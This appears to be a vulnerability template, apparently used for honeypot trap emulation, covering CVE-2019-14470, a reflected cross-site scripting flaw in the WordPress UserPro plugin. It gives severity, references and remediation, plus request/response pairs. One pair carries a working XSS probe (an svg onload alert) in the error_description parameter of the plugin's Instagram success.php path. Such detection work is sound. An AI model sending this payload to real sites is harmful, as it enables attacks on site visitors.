id: CVE-2019-14470
info:
  name: WordPress UserPro 4.9.32 - Cross-Site Scripting
  author: daffainfo
  description: WordPress UserPro 4.9.32 is vulnerable to reflected cross-site scripting
    because the Instagram PHP API (v2) it relies on allows it via the example/success.php
    error_description parameter.
  severity: medium
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary JavaScript code in the context of the victim''s browser, potentially
    leading to session hijacking, defacement, or theft of sensitive information.

    '
  remediation: 'Update to the latest version of UserPro or apply the provided patch
    to fix the XSS vulnerability.

    '
  reference:
  - https://wpscan.com/vulnerability/9815
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14470
  - http://packetstormsecurity.com/files/154206/WordPress-UserPro-4.9.32-Cross-Site-Scripting.html
  - https://wpvulndb.com/vulnerabilities/9815
  - https://nvd.nist.gov/vuln/detail/CVE-2019-14470
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2019-14470
    cwe-id: CWE-79
    epss-score: 0.79707
    epss-percentile: 0.98209
    cpe: cpe:2.3:a:instagram-php-api_project:instagram-php-api:-:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: instagram-php-api_project
    product: instagram-php-api
  tags: cve,cve2019,wordpress,xss,wp-plugin,wpscan,packetstorm,instagram-php-api_project
traps:
- request:
    method: GET
    path: /
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: /wp-content/plugins/userpro/
- request:
    method: GET
    path: /wp-content/plugins/userpro/lib/instagram/vendor/cosenary/instagram/example/success.php?error=&error_description=%3Csvg/onload=alert(1)%3E
    headers: null
    body: null
  response:
    status_code: 200
    headers:
      VulTrap: text/html
    body: <svg/onload=alert(1)>
